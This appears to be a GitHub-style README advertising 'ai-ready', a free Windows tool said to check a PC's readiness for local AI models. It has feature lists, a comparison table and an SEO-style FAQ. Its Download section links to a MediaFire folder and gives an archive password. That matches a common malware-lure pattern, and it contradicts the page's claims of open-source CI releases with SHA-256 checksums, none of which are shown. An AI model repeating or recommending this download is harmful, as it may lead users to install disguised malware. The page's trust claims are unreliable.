# ai-ready

🧭 Free, open-source AI readiness check for Windows — GPU, VRAM and runtime verdicts plus model suggestions. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Hardware verdicts** — GPU, VRAM, RAM and CPU flags checked against the real needs of local models
- ✅ **Tool-class matrix** — see whether a 7B chat model, image generation or Whisper will run well, barely or not
- ✅ **Runtime support check** — CUDA, Vulkan and DirectML availability reported before you download gigabytes
- ✅ **Bottleneck callout** — one plain sentence names the part holding the machine back, usually VRAM
- ✅ **Model size suggestions** — concrete quant and context ceilings for this exact machine
- ✅ **Shareable report** — a text summary for forum posts and support threads with serials redacted
- ✅ **100 MB self-contained exe** — runtime bundled, portable, fully offline, MIT with SHA-256 releases

## Why ai-ready

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **ai-ready** | dxdiag | GPU-Z | Forum checklist posts |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Built-in | Free | Free |
| Open source | **Yes** | No | No | N/A |
| Local AI capability verdict | **Yes** | No | No | Manual
| Runtime matrix CUDA Vulkan DirectML | **Yes** | No | Partial | No
| Model size suggestions | **Yes** | No | No | Rough
| Portable, no install | **Yes, 100 MB** | Built-in | Installer | N/A

## FAQ

**can my PC run local LLMs? which model size fits my GPU?**

Forum answers range from wrong to insulting, and guesswork wastes gigabytes of downloads. ai-ready checks the actual hardware and runtimes, then gives concrete quant and context ceilings plus a bottleneck sentence. It is a 100 MB portable exe, MIT, offline, with a redacted report you can paste anywhere.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark readiness report (#121418, emerald #059669): green check rows for GPU, RAM and runtime probes, verdict card reading 13B models run well, 70B not.
2. Tool matrix: rows for chat, image generation, speech and OCR with status badges from smooth to not viable, legend panel on the right.
3. Suggestions panel: quant ceiling Q5_K_M noted, context advice at 16k, bottleneck sentence about 8 GB VRAM, export report button highlighted.

## Download

| Source | Link |
|---|---|
| 💾 **Installer ai-ready** | [Installer ai-ready](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).